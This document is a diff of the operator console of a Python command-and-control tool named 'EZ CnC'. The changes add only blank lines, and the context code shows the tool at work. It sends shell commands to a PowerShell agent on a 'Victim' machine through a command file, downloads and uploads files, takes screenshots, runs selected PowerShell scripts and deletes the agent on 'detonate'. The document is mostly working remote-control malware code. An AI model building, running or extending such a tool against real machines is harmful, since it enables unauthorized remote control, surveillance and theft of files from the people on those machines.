@@ -2,6 +2,7 @@
 
 #########
 ## Version 0.5.0 of the EZ CnC
+
 ##
 ## COMPLETE: HTTPS
 ## COMPLETE: Screenshots 
@@ -33,6 +34,7 @@
 ## COMPLETE: Added functions for each Item, such as 1, 2,3,shell, etc.
 ## COMPLETE: Began clearscreen/server details at the top
 ## COMPLETE: CONVERTED TO Python3
+
 
 ######
 # IMPORT
@@ -108,6 +110,7 @@ def cleanupFunc():
     print((green3 + " Server successfully shutdown, Goodbye!"))
 
 
+
 def keyboardFunc():
     input(green3 + " Press Enter to continue...")
 
@@ -144,6 +147,7 @@ def mainLoopFunc(user_input):
         print('its an command')
         #print("COMMAND!")
         mainLoopFunc.command_input = input(yellow1 + " What command do you want to run?\n")
+
         #print("Command is " + command_input)
 
         # Write command to cc
@@ -160,6 +164,7 @@ def mainLoopFunc(user_input):
         print('its a download')
         #print(green3 + "DOWNLOAD FROM VICTIM")
         mainLoopFunc.command_input = input(yellow1 + " What file do you want to Download from Victim?\n")
+
         # Write command to cc
         f = open (cc, 'w')
         f.write(user_input + '\n')
@@ -167,6 +172,7 @@ def mainLoopFunc(user_input):
         f.close()
 
         print((yellow1 + " Waiting for results.."))
+
         time.sleep(SLEEP)
         time.sleep(SLEEP)
 
@@ -176,10 +182,12 @@ def mainLoopFunc(user_input):
         print((green3 + " " + mainLoopFunc.command_input + " has been downloaded and saved to " + pwd + '/Files/' + mainLoopFunc.command_input))
 
 
+
     def upload():
         print('its a upload')
         #print("UPLOAD TO VICTIM")
         mainLoopFunc.command_input = input(yellow2 + " What file do you want to Upload to Victim?\n")
+
         # Write command to cc
         f = open (cc, 'w')
         f.write(user_input + '\n')
@@ -192,6 +200,7 @@ def mainLoopFunc(user_input):
         print((yellow1 + " Uploading file to Victim..."))
         time.sleep(SLEEP)
         print((yellow1 + " Let's make sure it's there.."))
+
 
         # Validate it's there by running "dir <file>" on victim
         f = open (cc, 'w')
@@ -210,6 +219,7 @@ def mainLoopFunc(user_input):
     def screenCap():
         print((yellow1 + " Performing Screen Capture..."))
 
+
         # Blank out cc.js
         f = open (cc, 'w')
         f.write("")
@@ -226,6 +236,7 @@ def mainLoopFunc(user_input):
         print((green3 + " Screen Capture Complete!"))
         time.sleep(1)
         print((yellow1 + " Grabbing Screen Capture..."))
+
         time.sleep(3)
 
         # Make Date File for Screenshot name
@@ -252,6 +263,7 @@ def mainLoopFunc(user_input):
         #output = os.system(command)
         print((colorGreen + str(output) + colorBlack))
 
+
         #time.sleep(2)
 
 
@@ -259,17 +271,20 @@ def mainLoopFunc(user_input):
         mainLoopFunc.command_input = input(red2 + " You have requested to detonate the agent. Are you sure? 'yes' or 'no'\n")
         if mainLoopFunc.command_input == 'yes':
             command2 = input(red3 + " To make sure you really want this, type 'yes' again\n")
+
             if command2 == 'yes':
                 # SEND THE RM ./EZ-AGENT.ps1' command
                 # TODO: SEND A CUSTOM MESSAGE TO AGENT
                 # TODO: ADD LOOP ON AGENT.PS1.. if CUSTOM MESSAGE, KILL powershell
                 print((red4 + " Executing detonation..."))
+
                 f = open (cc, 'w')
                 f.write('detonate\n')
                 f.write('rm .\EZCNC-Agent.ps1\n')
                 f.close()
                 time.sleep(SLEEP)
                 print((red4 + " BOOM!! Agent destroyed.. Goodbye.."))
+
                 #continue
                 #break # break command2 if
                 pass
@@ -279,6 +294,7 @@ def mainLoopFunc(user_input):
                 pass
         else:
             print((red1 + " Good call! Not today.."))
+
             #continue # break for "if yes"
             pass
         #continue # Continue for elif
@@ -297,16 +313,19 @@ def mainLoopFunc(user_input):
         for list in scripts:
             print((yellow2 + " Choose: " + str(scripts.index(list)+1) + " for " + list))
 
+
         #print("There are a total of " + str(totalScripts))
 
         while True:
             try:
                 mainLoopFunc.command_input = int(input(yellow2 + " Choose the Script # or '0' to quit\n"))
+
             except ValueError:
                 print("[-] That's not a number!")
             else:
                 if mainLoopFunc.command_input == 0:
                     print((red4 + " Okay we leave, goodbye"))
+
                     break
                 
                 elif 1 <= mainLoopFunc.command_input <= int(totalScripts):
@@ -318,6 +337,7 @@ def mainLoopFunc(user_input):
                     second_input = str(input(yellow3 + " Are you sure you want to run?? 'yes' or 'no'\n"))
                     if second_input == 'no':
                         print((red1 + " Good catch, leaving.."))
+
                         break
                     elif second_input == 'yes':
                         #print("Good job!")
@@ -343,6 +363,7 @@ def mainLoopFunc(user_input):
                         #print("[!] Script is being processed...")
                         time.sleep(10)
                         print((yellow1 + " Output it being uploaded..."))
+
                         # END FLUFF SLEEP
                         ######
 
@@ -355,6 +376,7 @@ def mainLoopFunc(user_input):
 
                         time.sleep(10)
                         print((yellow1 + " Waiting for results..."))
+
                         time.sleep(10)
 
 
@@ -366,6 +388,7 @@ def mainLoopFunc(user_input):
                         # Print completion
                         print((green1 + ' ' + choice + " has been completed and results have been saved to:\n " + pwd + '/Files/' + choice[:-4] + time.strftime("%Y%m%d-%H%M%S") + ".txt"))                      
 
+
                         # Remove the choice.ps1 from WebOnly
                         os.remove('./WebOnly/' + choice)
                         break
@@ -375,6 +398,7 @@ def mainLoopFunc(user_input):
                         continue
                 else:
                     print((red4 + " Out of Range, try again!"))
+
                     continue
 
 
@@ -400,6 +424,7 @@ def mainLoopFunc(user_input):
     elif user_input == '4':
         screenCap()
         print((yellow1 + " Waiting for results.."))
+
     elif user_input == 'shell':
         shell()
     elif user_input == 'detonate':
@@ -414,6 +439,7 @@ def mainLoopFunc(user_input):
         pass
     else:
         print((red3 + " Invalid command.. let's start over"))
+
 
     time.sleep(10)
 
@@ -476,6 +502,7 @@ if __name__ == "__main__":
         # Print output from last command. Open up a temp file that is being printed to from server.py
         e = open("./Logs/temp.txt", "r")
         print((colorGreen + e.read() + colorBlack))
+
         e.close()
         
         # Current Server Port
@@ -488,12 +515,14 @@ if __name__ == "__main__":
         else:
             print(("Current Server Port is: " + colorRed + main.port + colorBlack))
             print(("Current Server Port is: " + colorRed + "Closed" + colorBlack))
+
         a_socket.close()
  
         print('')
 
         howToFunc()
         user_input = str(input(yellow1 + \
+
                 " Type " + colorBlue + "1" + colorBlack + \
                 ", " + colorBlue + "2" + colorBlack + \
                 ", " + colorBlue + "3" + colorBlack + \
